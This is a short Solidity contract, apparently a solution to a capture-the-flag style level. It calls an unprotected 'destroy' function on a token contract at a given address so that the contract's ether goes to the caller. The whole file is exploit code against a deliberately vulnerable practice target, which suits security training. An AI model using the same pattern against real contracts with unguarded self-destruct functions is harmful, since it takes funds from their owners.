// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract HackRecovery {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function withdraw() public {
        ISimpleToken(levelInstance).destroy(payable(msg.sender));
    }
}